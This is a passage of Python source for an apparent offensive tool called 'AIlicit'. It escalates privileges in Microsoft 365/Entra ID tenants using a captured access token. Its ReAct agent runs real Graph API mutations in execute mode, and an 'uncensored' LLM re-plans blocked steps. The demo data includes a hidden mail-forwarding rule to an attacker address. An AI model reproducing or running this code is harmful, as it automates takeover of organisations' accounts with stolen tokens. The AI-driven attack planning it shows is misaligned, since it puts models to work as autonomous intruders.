                targets.append(self._make_target(e.path_id, e.name, e.description,
                                                e.resolved_steps(), e.graph_call, e, "deterministic"))
        return targets

    @staticmethod
    def _make_target(path_id: str, name: str, description: str, steps: List[str],
                     graph_call: str, edge: Optional[EscalationEdge], source: str) -> Dict[str, Any]:
        plan: List[Dict[str, Any]] = []
        for i, step in enumerate(steps or []):
            plan.append({
                "step": i + 1,
                "action": step,
                "method": "graph",
                "endpoint": graph_call if i == 0 else "",
                "verify": f"Confirm the effect of: {step}",
                "rollback": "" if i == len(steps) - 1 else "Revert via inverse Graph call",
                "dry_run_default": True,
            })
        target: Dict[str, Any] = {
            "path_id": path_id,
            "name": name,
            "description": description,
            "source": source,
            "execution_plan": plan,
        }
        if edge is not None:
            target["required_scopes"] = edge.required_scopes
            target["gain"] = edge.gain
            target["evidence"] = edge.evidence
            target["reversible"] = edge.reversibility
        return target

    # ----------------------------------------------------------
    def run(self, recon_data: Optional[ReconData] = None) -> Dict:
        """Run the complete privilege escalation pipeline. Returns JSON-serialisable dict."""
        logger.info("=" * 60)
        logger.info("PRIVILEGE ESCALATION ENGINE STARTING")
        logger.info("=" * 60)

        # Phase 1: Recon
        logger.info("[PHASE 1] RECON DATA")
        self.recon_data = recon_data
        logger.info("[+] Granted scopes: %s", self.recon_data.granted_scopes or "(none)")
        logger.info("[+] Groups: %d | Applications: %d | Mail rules: %d | Misconfigs: %d",
                    len(self.recon_data.groups), len(self.recon_data.applications),
                    len(self.recon_data.mail_rules), len(self.recon_data.misconfigs))

        # Phase 2: Deterministic edge expansion
        logger.info("[PHASE 2] DETERMINISTIC EDGE EXPANSION")
        expander = EdgeExpander(self.recon_data)
        self.edges = expander.expand()
        candidate_paths_json = json.dumps([asdict(e) for e in self.edges], indent=2)
        logger.info("[+] %d candidate escalation paths", len(self.edges))

        if not self.edges:
            logger.error("[-] No candidate paths (check granted scopes)")
            return {
                "status": "failed",
                "reason": "no_candidate_paths",
                "granted_scopes": self.recon_data.granted_scopes,
                "total_candidate_paths": 0,
                "candidate_paths": [],
                "attempt_targets": [],
                "top_3_paths": [],
            }

        # Phase 3: Foundation-Sec-8B analyst selection (with fallbacks)
        logger.info("[PHASE 3] PATH SELECTION (Foundation-Sec-8B analyst)")
        reasoner = SecAnalyst()
        self.ranked_paths = reasoner.select_paths(self.edges, self.recon_data)
        logger.info("[+] Top %d paths selected (source: %s)",
                    len(self.ranked_paths),
                    self.ranked_paths[0].source if self.ranked_paths else "none")
        for idx, p in enumerate(self.ranked_paths, 1):
            logger.info("    [%d] %s - %.1f%%", idx, p.name, p.probability * 100)

        # Phase 4: Summary JSON
        logger.info("=" * 60)
        logger.info("ESCALATION ANALYSIS COMPLETE")
        logger.info("=" * 60)

        top3 = []
        for p in self.ranked_paths:
            d = asdict(p)
            d["probability_percent"] = round(p.probability * 100, 1)
            top3.append(d)

        return {
            "status": "success",
            "engine": "deterministic-m365-graph + foundation-sec-8b",
            "recon": {
                "granted_scopes": self.recon_data.granted_scopes,
                "user": self.recon_data.user.get("userPrincipalName") if self.recon_data.user else None,
                "groups_found": len(self.recon_data.groups),
                "applications_found": len(self.recon_data.applications),
                "applications_owned": sum(1 for a in self.recon_data.applications if a.get("user_owns")),
                "privileged_roles": [r.get("displayName") for r in self.recon_data.privileged_roles],
                "mail_rules": len(self.recon_data.mail_rules),
                "misconfigs": self.recon_data.misconfigs,
            },
            "total_candidate_paths": len(self.edges),
            "candidate_paths_json": candidate_paths_json,
            "attempt_targets": self.build_attempt_targets(),
            "selection_source": self.ranked_paths[0].source if self.ranked_paths else "deterministic",
            "top_3_paths": top3,
            "timestamp": datetime.now().isoformat(),
        }


# ============================================================
# INTEGRATION WITH POSTEXP.PY
# ============================================================

def run_privesc(token_mgr, recon_data: Dict) -> Dict:
    """
    Integration point for postexp.py.

    Args:
        token_mgr:   TokenManager instance from postexp.py
        recon_data:  Dict returned by postexp.parallel_recon(token_mgr)
                     (inbox_rules, contacts, events, sent_items, mail_folders,
                      manager, direct_reports, organization)

    Returns:
        Dict with keys: status, total_candidate_paths, candidate_paths_json,
        top_3_paths (list of 3 ranked paths incl. probability_percent).
    """
    try:
        engine = PrivilegeEscalationEngine(token_mgr=token_mgr)
        recon = engine.build_recon_from_parallel(recon_data or {})
        return engine.run(recon_data=recon)
    except Exception as e:
        logger.exception("run_privesc failed")
        return {
            "status": "error",
            "reason": str(e),
            "total_candidate_paths": 0,
            "candidate_paths_json": "[]",
            "top_3_paths": [],
        }


def run_privesc_freestyle(token_mgr, max_turns: int = 8) -> Dict:
    """
    Freestyle, non-deterministic privilege-escalation hunt.

    Hands the captured token to Foundation-Sec-8B (SecExplorer) and lets it
    freely query Microsoft Graph to discover escalation routes on its own -
    independent of the deterministic EDGE_TABLE used by run_privesc().

    Args:
        token_mgr: TokenManager instance from postexp.py
        max_turns: max exploration turns (tool calls) before forcing a finish

    Returns:
        Dict with keys: status, model, queries_explored, paths (list of
        free-form escalation paths with name/description/steps/probability/evidence).
    """
    try:
        explorer = SecExplorer(token_mgr)
        explorer.MAX_TURNS = max(1, max_turns)
        paths = explorer.explore()
        return {
            "status": "success",
            "method": "sec-8b-freestyle",
            "model": SEC_MODEL,
            "queries_explored": explorer.queries_made,
            "paths": paths,
            "path_count": len(paths),
            "timestamp": datetime.now().isoformat(),
        }
    except Exception as e:
        logger.exception("run_privesc_freestyle failed")
        return {
            "status": "error",
            "reason": str(e),
            "method": "sec-8b-freestyle",
            "paths": [],
            "path_count": 0,
        }


# ============================================================
# REACT PRIVESC AGENT (Task 4 + 5)
# ============================================================

class PrivescAgent:
    """ReAct loop that ATTEMPT discovered escalation paths one step at a time.

    Behaviour:
      * DRY-RUN by default: every step is validated (scope gate + endpoint
        sanity) and logged but NOT executed. Pass execute=True to mutate.
      * One action at a time: run step -> observe -> next step.
      * On failure the replanner model (REPLAN_MODEL, fallback SEC_MODEL) is
        asked to re-plan the remaining steps; all LLM traffic is serialised
        through llm_call().
      * Granted scopes are re-checked LIVE from the current token before
        every step (token_mgr.current_scopes() if available, else the JWT).
      * Structured failure reports: "Attempted path X. Blocked at step N
        because ..." with suggested_alternative from the replanner.
    Caps: MAX_STEPS_PER_PATH per path, MAX_PATHS paths per run.
    """

    MAX_STEPS_PER_PATH = 6
    MAX_PATHS = 3

    REPLANNER_SYSTEM = (
        "You are a re-planning agent for an M365/Entra ID privilege-escalation "
        "automation. The main agent attempted a multi-step path and FAILED at one "
        "step. Given the goal, the steps already completed, the failed step, the "
        "error, and the live granted scopes, either:\n"
        "A) re-plan the REMAINING steps as a concrete list (same scope level as before), or\n"
        "B) declare the path dead and suggest the closest alternative target.\n"
        "Return ONLY JSON: {\"decision\": \"replan\" | \"abort\", "
        "\"reason\": \"one sentence\", \"remaining_steps\": [\"step\", ...], "
        "\"suggested_alternative\": \"path_id or short label or empty\"}"
    )

    def __init__(self, token_mgr, execute: bool = False, max_paths: int = 3):
        self.token_mgr = token_mgr
        self.execute = execute
        self.max_paths = min(max_paths, self.MAX_PATHS)
        self.replan_url = (REPLAN_BASE_URL or SEC_BASE_URL or "").rstrip("/") + "/chat/completions"
        self.replan_key = REPLAN_API_KEY or SEC_API_KEY
        self.replan_model = REPLAN_MODEL or SEC_MODEL
        self.reports: List[Dict[str, Any]] = []

    # ----------------------------------------------------------
    def live_scopes(self) -> List[str]:
        """Freshly decode scopes from the CURRENT token (not a cached value)."""
        if self.token_mgr is not None and hasattr(self.token_mgr, "current_scopes"):
            try:
                return self.token_mgr.current_scopes()
            except Exception:
                pass
        if self.token_mgr is not None and getattr(self.token_mgr, "access_token", None):
            return scopes_from_token(self.token_mgr.access_token)
        return []

    @staticmethod
    def _scopes_met(required: List[str], granted: List[str]) -> bool:
        granted = [s for s in (granted or []) if s]
        def has(scope: str) -> bool:
            if scope in granted:
                return True
            base, _, variant = scope.rpartition(".")
            if variant == "ReadWrite" and base and f"{base}.ReadWrite.All" in granted:
                return True
            if variant in ("Read", "ReadWrite") and base:
                if f"{base}.{variant}.All" in granted or f"{base}.ReadWrite.All" in granted:
                    return True
            return False
        return all(has(s) for s in (required or []))

    # ----------------------------------------------------------
    def run(self, attempt_targets: List[Dict[str, Any]]) -> Dict[str, Any]:
        targets = (attempt_targets or [])[:self.max_paths]
        print()
        print("-" * 60)
        mode = "EXECUTE (mutations applied)" if self.execute else "DRY-RUN (validate only, nothing is mutated)"
        print(f"[Agent] ReAct privesc agent starting - {mode} - {len(targets)} target(s)")
        print("-" * 60)
        summary: List[Dict[str, Any]] = []
        for t in targets:
            report = self._attempt_target(t)
            self.reports.append(report)
            summary.append(report)
            self._print_report(report)
        return {
            "status": "success",
            "mode": "execute" if self.execute else "dry_run",
            "attempted": len(summary),
            "succeeded": sum(1 for r in summary if r["outcome"] == "success"),
            "blocked": sum(1 for r in summary if r["outcome"] in ("blocked", "replanned_blocked")),
            "reports": summary,
            "timestamp": datetime.now().isoformat(),
        }

    # ----------------------------------------------------------
    def _attempt_target(self, target: Dict[str, Any]) -> Dict[str, Any]:
        path_id = target.get("path_id", "unknown")
        steps = [s.get("action") for s in (target.get("execution_plan") or []) if s.get("action")]
        steps = steps[:self.MAX_STEPS_PER_PATH]
        required = target.get("required_scopes") or []
        report: Dict[str, Any] = {
            "path_id": path_id,
            "name": target.get("name", ""),
            "outcome": "success",
            "blocked_at": None,
            "reason": None,
            "evidence": target.get("evidence") or {},
            "steps_done": [],
            "suggested_alternative": None,
            "replanned": False,
        }

        # Gate 0: live scope check BEFORE starting.
        scopes = self.live_scopes()
        if required and not self._scopes_met(required, scopes):
            report.update(outcome="blocked", blocked_at=0,
                          reason=f"required scopes {required} not satisfied by live scopes {scopes}")
            return report

        for i, step in enumerate(steps, 1):
            # Gate: re-check live scopes before every step (scope may have changed
            # after a mutation, e.g. the app re-issued a token with new grants).
            scopes = self.live_scopes()
            if required and not self._scopes_met(required, scopes):
                report.update(outcome="blocked", blocked_at=i,
                              reason=f"live scope re-check failed before step {i}: {scopes}")
                return report
            try:
                ok, detail = self._execute_step(step, self.execute)
            except Exception as e:
                ok, detail = False, str(e)
            if ok:
                report["steps_done"].append({"step": i, "action": step, "detail": detail})
                print(f"    [agent] {path_id} step {i}: {'done' if self.execute else 'validated'} - {detail[:100]}")
                continue
            # Failure -> replanner re-plan (Task 4) + structured report (Task 5).
            print(f"    [agent] {path_id} BLOCKED at step {i}: {detail[:160]}")
            re = self._replan(target, i, step, detail, scopes)
            report["replanned"] = True
            if re and re.get("decision") == "replan" and re.get("remaining_steps"):
                report["suggested_alternative"] = "; ".join(re["remaining_steps"][:4])
                report.update(outcome="replanned_blocked", blocked_at=i,
                              reason=re.get("reason") or f"step {i} failed: {detail}")
            else:
                report["suggested_alternative"] = (re or {}).get("suggested_alternative") or None
                report.update(outcome="blocked", blocked_at=i,
                              reason=((re or {}).get("reason") or f"step {i} failed") + f" ({detail})")
            return report
        return report

    # ----------------------------------------------------------
    def _execute_step(self, step: str, execute: bool) -> tuple:
        """Execute (or dry-run validate) a single step.

        Steps that are Graph calls (start with GET/PUT/POST/PATCH/DELETE) are
        mapped to real Graph mutations in execute mode; everything else is
        validated as a no-op with a note. Never raises for scope/endpoint
        issues - returns (False, reason) so the agent can re-plan.
        """
        s = (step or "").strip()
        if not s:
            return False, "empty step"
        m = re.match(r"^(GET|PUT|POST|PATCH|DELETE)\s+(/\S+)", s)
        if not m:
            # Non-Graph action (e.g. 'Verify ...', 'Rotate client secret ...')
            if not execute:
                return True, "dry-run: action recorded (no mutation needed to validate)"
            return True, "recorded (manual/non-Graph action)"
        method, endpoint = m.group(1), m.group(2)
        if not execute:
            return True, f"dry-run: {method} {endpoint} would be invoked"
        if method == "GET":
            data = _graph_get(self.token_mgr, endpoint)
            return True, f"GET ok ({json.dumps(data)[:120]})"
        # Mutations require an app-only token in most tenants; do the call and
        # surface the HTTP error so the agent can re-plan.
        if self.token_mgr is None or not getattr(self.token_mgr, "access_token", None):
            return False, "no live token for mutation"
        url = GRAPH_BASE + endpoint
        resp = requests.request(
            method, url,
            headers={"Authorization": f"Bearer {self.token_mgr.access_token}",
                     "Content-Type": "application/json"},
            json={}, timeout=30,
        )
        if 200 <= resp.status_code < 300:
            return True, f"{method} ok (HTTP {resp.status_code})"
        return False, f"{method} failed HTTP {resp.status_code}: {resp.text[:200]}"

    # ----------------------------------------------------------
    def _replan(self, target: Dict[str, Any], failed_step: int, step: str,
                error: str, scopes: List[str]) -> Optional[Dict[str, Any]]:
        """Ask the replanner model (Qwen3.5-9B-Uncensored) to re-plan or abort."""
        if not (self.replan_key or self.replan_url):
            return {"decision": "abort", "reason": "replanner not configured", "suggested_alternative": None}
        payload_steps = [s.get("action") for s in (target.get("execution_plan") or [])]
        prompt = (
            "GOAL: " + (target.get("name") or target.get("path_id")) + "\n"
            "ALL STEPS: " + json.dumps(payload_steps) + "\n"
            f"COMPLETED: steps 1-{failed_step - 1}\n"
            f"FAILED AT STEP {failed_step}: {step}\n"
            f"ERROR: {error[:400]}\n"
            f"LIVE GRANTED SCOPES: {json.dumps(scopes)}\n"
        )
        headers = {"Content-Type": "application/json"}
        if self.replan_key:
            headers["Authorization"] = f"Bearer {self.replan_key}"
        body = {
            "model": self.replan_model,
            "messages": [
                {"role": "system", "content": self.REPLANNER_SYSTEM},
                {"role": "user", "content": prompt},
            ],
            "temperature": 0.2,
            "max_tokens": 900,
            "think": False,
        }
        try:
            with llm_call():
                resp = requests.post(self.replan_url, json=body, headers=headers, timeout=180)
            if resp.status_code != 200:
                logger.warning("[Agent] replanner HTTP %s: %s", resp.status_code, resp.text[:200])
                return None
            data = _extract_json(resp.json()["choices"][0]["message"]["content"])
            return data if isinstance(data, dict) else None
        except Exception as e:
            logger.warning("[Agent] replanner unavailable: %s", e)
            return None

    # ----------------------------------------------------------
    @staticmethod
    def _print_report(report: Dict[str, Any]):
        outcome = report["outcome"]
        bar = "[+]" if outcome == "success" else "[!]"
        print(f"  {bar} {report['path_id']}: {outcome}"
              + (f" - blocked at step {report['blocked_at']}" if report["blocked_at"] else ""))
        if report.get("reason"):
            print(f"      reason: {report['reason'][:300]}")
        if report.get("suggested_alternative"):
            print(f"      alternative: {report['suggested_alternative'][:200]}")
        # Structured, greppable failure line (Task 5):
        if outcome in ("blocked", "replanned_blocked"):
            print(f"      >>> Attempted path {report['path_id']}. Blocked at step {report['blocked_at']} "
                  f"because {report['reason']}")


def run_privesc_agent(token_mgr, attempt_targets: List[Dict[str, Any]],
                     execute: bool = False, max_paths: int = 3) -> Dict:
    """Run the ReAct privesc agent over attempt_targets (from run_privesc).

    Args:
        token_mgr: TokenManager instance from postexp.py (live scope re-checks)
        attempt_targets: result["attempt_targets"] from run_privesc()
        execute: False = dry-run (default), True = apply Graph mutations
        max_paths: how many targets to attempt (capped at 3)

    Returns:
        Dict with keys: status, mode, attempted, succeeded, blocked, reports
        (each report is a structured failure/success record incl. the
        "Attempted path X. Blocked at step N because ..." line).
    """
    try:
        agent = PrivescAgent(token_mgr, execute=execute, max_paths=max_paths)
        return agent.run(attempt_targets or [])
    except Exception as e:
        logger.exception("run_privesc_agent failed")
        return {"status": "error", "reason": str(e), "reports": []}


# ============================================================
# COMMAND-LINE ENTRY POINT
# ============================================================

def _demo_recon() -> ReconData:
    """Demo recon for standalone execution (no live token needed)."""
    recon = ReconData(
        granted_scopes=[
            "Mail.Read", "Mail.ReadWrite", "offline_access", "User.Read",
            "Application.ReadWrite.All", "Directory.ReadWrite.All",
            "Mail.Send", "Calendars.ReadWrite", "Contacts.ReadWrite",
            "Files.ReadWrite.All",
        ],
        user={
            "id": "user-001",
            "userPrincipalName": "security@contoso.com",
            "displayName": "Security User",
        },
        groups=[
            {"id": "group-001", "displayName": "Admin-SG-01", "is_owner": False},
            {"id": "group-002", "displayName": "Domain Admins", "is_owner": False},
        ],
        applications=[
            {"id": "app-001", "displayName": "Contoso-Admin-App",
             "servicePrincipalType": "Application", "is_owner": False},
        ],
        mail_rules=[
            {"isEnabled": True, "isHidden": True,
             "actions": {"forwardTo": [{"emailAddress": {"address": "attacker@demo.com"}}]}},
        ],
        contacts=[{"id": "c1", "displayName": "Finance Dept", "emailAddresses": ["finance@contoso.com"]}],
        misconfigs=[],
    )
    recon.misconfigs = _detect_misconfigs(recon)
    return recon


def main():
    for stream in (sys.stdout, sys.stderr):
        try:
            stream.reconfigure(encoding="utf-8")
        except (AttributeError, ValueError):
            pass

    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║        PRIVILEGE ESCALATION ENGINE - AIlicit                  ║
    ║        Deterministic Graph + Foundation-Sec-8B · Top 3           ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)

    engine = PrivilegeEscalationEngine()
    result = engine.run(recon_data=_demo_recon())

    print("\n" + json.dumps(result, indent=2))

    print("\n" + "=" * 60)
    print("TOP 3 PRIVESC PATHS")
    print("=" * 60)
    for idx, path in enumerate(result.get("top_3_paths", []), 1):
        print(f"\n[{idx}] {path['name']}")
        print(f"    Probability: {path['probability_percent']}%")
        print(f"    Impact:      {path['impact']}")
        print(f"    Steps:       {' -> '.join(path['steps'])}")
        print(f"    Reasoning:   {path['reasoning']}")
        print(f"    Narrative:   {path['narrative']}")
        print(f"    Source:      {path['source']}")


if __name__ == "__main__":
    main()
